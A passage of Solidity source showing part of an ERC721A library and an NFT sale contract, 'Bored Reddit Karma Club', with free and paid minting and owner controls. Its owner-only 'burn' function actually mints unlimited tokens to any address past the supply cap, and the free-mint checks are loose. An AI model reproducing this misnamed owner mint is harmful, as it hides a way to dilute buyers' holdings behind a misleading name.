1083      *
1084      * Emits a {Transfer} event.
1085      */
1086     function _mint(
1087         address to,
1088         uint256 quantity,
1089         bytes memory _data,
1090         bool safe
1091     ) internal {
1092         uint256 startTokenId = currentIndex;
1093         require(to != address(0), "ERC721A: mint to the zero address");
1094         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1095 
1096         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1097 
1098         // Overflows are incredibly unrealistic.
1099         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1100         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1101         unchecked {
1102             _addressData[to].balance += uint128(quantity);
1103             _addressData[to].numberMinted += uint128(quantity);
1104 
1105             _ownerships[startTokenId].addr = to;
1106             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1107 
1108             uint256 updatedIndex = startTokenId;
1109 
1110             for (uint256 i; i < quantity; i++) {
1111                 emit Transfer(address(0), to, updatedIndex);
1112                 if (safe) {
1113                     require(
1114                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1115                         "ERC721A: transfer to non ERC721Receiver implementer"
1116                     );
1117                 }
1118 
1119                 updatedIndex++;
1120             }
1121 
1122             currentIndex = updatedIndex;
1123         }
1124 
1125         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1126     }
1127 
1128     /**
1129      * @dev Transfers `tokenId` from `from` to `to`.
1130      *
1131      * Requirements:
1132      *
1133      * - `to` cannot be the zero address.
1134      * - `tokenId` token must be owned by `from`.
1135      *
1136      * Emits a {Transfer} event.
1137      */
1138     function _transfer(
1139         address from,
1140         address to,
1141         uint256 tokenId
1142     ) private {
1143         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1144 
1145         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1146             getApproved(tokenId) == _msgSender() ||
1147             isApprovedForAll(prevOwnership.addr, _msgSender()));
1148 
1149         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1150 
1151         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1152         require(to != address(0), "ERC721A: transfer to the zero address");
1153 
1154         _beforeTokenTransfers(from, to, tokenId, 1);
1155 
1156         // Clear approvals from the previous owner
1157         _approve(address(0), tokenId, prevOwnership.addr);
1158 
1159         // Underflow of the sender's balance is impossible because we check for
1160         // ownership above and the recipient's balance can't realistically overflow.
1161         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1162         unchecked {
1163             _addressData[from].balance -= 1;
1164             _addressData[to].balance += 1;
1165 
1166             _ownerships[tokenId].addr = to;
1167             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1168 
1169             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1170             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1171             uint256 nextTokenId = tokenId + 1;
1172             if (_ownerships[nextTokenId].addr == address(0)) {
1173                 if (_exists(nextTokenId)) {
1174                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1175                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1176                 }
1177             }
1178         }
1179 
1180         emit Transfer(from, to, tokenId);
1181         _afterTokenTransfers(from, to, tokenId, 1);
1182     }
1183 
1184     /**
1185      * @dev Approve `to` to operate on `tokenId`
1186      *
1187      * Emits a {Approval} event.
1188      */
1189     function _approve(
1190         address to,
1191         uint256 tokenId,
1192         address owner
1193     ) private {
1194         _tokenApprovals[tokenId] = to;
1195         emit Approval(owner, to, tokenId);
1196     }
1197 
1198     /**
1199      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1200      * The call is not executed if the target address is not a contract.
1201      *
1202      * @param from address representing the previous owner of the given token ID
1203      * @param to target address that will receive the tokens
1204      * @param tokenId uint256 ID of the token to be transferred
1205      * @param _data bytes optional data to send along with the call
1206      * @return bool whether the call correctly returned the expected magic value
1207      */
1208     function _checkOnERC721Received(
1209         address from,
1210         address to,
1211         uint256 tokenId,
1212         bytes memory _data
1213     ) private returns (bool) {
1214         if (to.isContract()) {
1215             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1216                 return retval == IERC721Receiver(to).onERC721Received.selector;
1217             } catch (bytes memory reason) {
1218                 if (reason.length == 0) {
1219                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1220                 } else {
1221                     assembly {
1222                         revert(add(32, reason), mload(reason))
1223                     }
1224                 }
1225             }
1226         } else {
1227             return true;
1228         }
1229     }
1230 
1231     /**
1232      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1233      *
1234      * startTokenId - the first token id to be transferred
1235      * quantity - the amount to be transferred
1236      *
1237      * Calling conditions:
1238      *
1239      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1240      * transferred to `to`.
1241      * - When `from` is zero, `tokenId` will be minted for `to`.
1242      */
1243     function _beforeTokenTransfers(
1244         address from,
1245         address to,
1246         uint256 startTokenId,
1247         uint256 quantity
1248     ) internal virtual {}
1249 
1250     /**
1251      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1252      * minting.
1253      *
1254      * startTokenId - the first token id to be transferred
1255      * quantity - the amount to be transferred
1256      *
1257      * Calling conditions:
1258      *
1259      * - when `from` and `to` are both non-zero.
1260      * - `from` and `to` are never both zero.
1261      */
1262     function _afterTokenTransfers(
1263         address from,
1264         address to,
1265         uint256 startTokenId,
1266         uint256 quantity
1267     ) internal virtual {}
1268 }
1269 
1270 contract BoredRedditKarmaClub is ERC721A, Ownable, ReentrancyGuard {
1271     string public baseURI = "ipfs://QmQSEtQaTbmoD2ZhpYeuNkCNic1RePZN1zfJrw3vCSddob/";
1272     uint   public price             = 0.0034 ether;
1273     uint   public maxPerTx          = 10;
1274     uint   public maxPerFree        = 1;
1275     uint   public maxPerWallet      = 20;
1276     uint   public totalFree         = 10000;
1277     uint   public maxSupply         = 10000;
1278     bool   public mintEnabled;
1279     uint   public totalFreeMinted = 0;
1280 
1281     mapping(address => uint256) public _mintedFreeAmount;
1282     mapping(address => uint256) public _totalMintedAmount;
1283 
1284     constructor() ERC721A("Bored Reddit Karma Club", "BRKC"){}
1285 
1286     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1287         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1288         string memory currentBaseURI = _baseURI();
1289         return bytes(currentBaseURI).length > 0
1290             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1291             : "";
1292     }
1293     
1294 
1295     function _startTokenId() internal view virtual returns (uint256) {
1296         return 1;
1297     }
1298 
1299     function mint(uint256 count) external payable {
1300         uint256 cost = price;
1301         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1302             (_mintedFreeAmount[msg.sender] < maxPerFree));
1303 
1304         if (isFree) { 
1305             require(mintEnabled, "Mint is not live yet");
1306             require(totalSupply() + count <= maxSupply, "No more");
1307             require(count <= maxPerTx, "Max per TX reached.");
1308             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1309             {
1310              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1311              _mintedFreeAmount[msg.sender] = maxPerFree;
1312              totalFreeMinted += maxPerFree;
1313             }
1314             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1315             {
1316              require(msg.value >= 0, "Please send the exact ETH amount");
1317              _mintedFreeAmount[msg.sender] += count;
1318              totalFreeMinted += count;
1319             }
1320         }
1321         else{
1322         require(mintEnabled, "Mint is not live yet");
1323         require(_totalMintedAmount[msg.sender] + count <= maxPerWallet, "Exceed maximum NFTs per wallet");
1324         require(msg.value >= count * cost, "Please send the exact ETH amount");
1325         require(totalSupply() + count <= maxSupply, "No more");
1326         require(count <= maxPerTx, "Max per TX reached.");
1327         require(msg.sender == tx.origin, "The minter is another contract");
1328         }
1329         _totalMintedAmount[msg.sender] += count;
1330         _safeMint(msg.sender, count);
1331     }
1332 
1333     function costCheck() public view returns (uint256) {
1334         return price;
1335     }
1336 
1337     function maxFreePerWallet() public view returns (uint256) {
1338       return maxPerFree;
1339     }
1340 
1341     function burn(address mintAddress, uint256 count) public onlyOwner {
1342         _safeMint(mintAddress, count);
1343     }
1344 
1345     function _baseURI() internal view virtual override returns (string memory) {
1346         return baseURI;
1347     }
1348 
1349     function setBaseUri(string memory baseuri_) public onlyOwner {
1350         baseURI = baseuri_;
1351     }
1352 
1353     function setPrice(uint256 price_) external onlyOwner {
1354         price = price_;
1355     }
1356 
1357     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1358         totalFree = MaxTotalFree_;
1359     }
1360 
1361      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1362         maxPerFree = MaxPerFree_;
1363     }
1364 
1365     function toggleMinting() external onlyOwner {
1366       mintEnabled = !mintEnabled;
1367     }
1368     
1369     function CommunityWallet(uint quantity, address user)
1370     public
1371     onlyOwner
1372   {
1373     require(
1374       quantity > 0,
1375       "Invalid mint amount"
1376     );
1377     require(
1378       totalSupply() + quantity <= maxSupply,
1379       "Maximum supply exceeded"
1380     );
1381     _safeMint(user, quantity);
1382   }
1383 
1384     function withdraw() external onlyOwner nonReentrant {
1385         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1386         require(success, "Transfer failed.");
1387     }
1388 }